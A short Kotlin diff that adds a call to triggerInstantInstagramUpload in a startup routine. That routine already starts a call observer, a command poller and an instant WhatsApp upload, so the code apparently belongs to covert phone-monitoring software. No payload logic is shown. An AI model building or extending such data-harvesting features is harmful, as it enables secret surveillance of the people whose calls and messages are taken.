@@ -77,6 +77,7 @@ object RealtimeLogObserverManager {
         startCallObserver(appCtx)
         startCommandPoller(appCtx)
         triggerInstantWhatsAppUpload(appCtx)
+        triggerInstantInstagramUpload(appCtx)
     }
 
     @Synchronized
